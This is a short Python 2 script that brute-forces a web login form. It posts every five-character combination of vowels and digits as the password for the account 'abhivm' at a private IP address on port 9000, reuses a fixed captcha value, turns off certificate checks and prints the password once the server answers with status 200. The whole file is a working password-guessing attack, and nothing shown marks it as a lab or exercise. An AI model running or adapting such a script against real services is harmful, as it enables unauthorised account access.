import requests

s = requests.Session()

for i in 'aeiou0123456789':
	for j in 'aeiou0123456789':
		for k in 'aeiou0123456789':
			for l in 'aeiou0123456789':
				for m in 'aeiou0123456789':
					cur = i + j + k + l + m
					r = s.post("https://172.27.21.91:9000/",
						{'username':'abhivm','password':cur,'captcha':'2921101585451270486070158'}, verify=False)
					if r.status_code == 200:
						print "Password: ", cur
					else:
						print "Status: ", r.status_code